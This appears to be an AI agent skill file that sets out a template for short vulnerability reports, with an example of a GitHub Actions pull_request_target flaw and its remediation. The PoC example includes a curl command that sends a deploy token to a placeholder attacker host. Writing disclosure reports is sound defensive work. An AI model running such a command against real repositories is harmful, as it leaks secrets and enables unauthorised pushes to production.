---
name: vuln-description
description: Write a terse, structured vulnerability description. Covers what it is, what it enables, PoC, and remediation. Less words is better.
allowed-tools: Read, Glob, Grep, Bash(*)
---

Describe the vulnerability using exactly this structure. Every section is mandatory. Cut every word that doesn't add information.

---

## What is it

One sentence. Name the class, name the mechanism. No filler.

> `pull_request_target` runs fork-contributed code in the base repo's privileged runner environment.

---

## What does it let me do

One to three sentences. Attacker-POV. Concrete capability, not abstract risk. Name the asset.

> Any GitHub account can open a fork PR that exfiltrates `DEPLOY_TOKEN` from a `run:` step. The token can push to the production branch.

---

## PoC

**Show working exploit steps or skip this section entirely — no theoretical walkthroughs.**

If you have a confirmed PoC: show the exact steps, commands, or payload. Link to a run, a commit, or a repro if one exists.

If you don't have a PoC: omit the section. Don't write "an attacker could..." prose here.

> ```yaml
> # In a fork PR against the target repo:
> - run: curl -s https://attacker.example/collect -d "token=$DEPLOY_TOKEN"
> ```
> Confirmed: the linked Actions run shows the workflow firing within seconds of the PR opening, with no approval required.

---

## Remediation

Bullet list. Shortest-path fix first. One line per item. No explanations unless the fix is non-obvious.

> - Add job condition: `github.event.pull_request.head.repo.full_name == github.repository`
> - Or: remove `ref: ${{ github.event.pull_request.head.sha }}` from the checkout step
> - Long-term: split workflow — `pull_request` uploads artifact, `workflow_run` consumes secrets

---

## Format rules

- No executive summary, no background, no "this vulnerability affects..."
- Bold only section headers
- Code blocks for all commands, payloads, config snippets
- If a claim needs evidence, link it inline — don't describe the evidence, link it
- Max length: fit on one screen
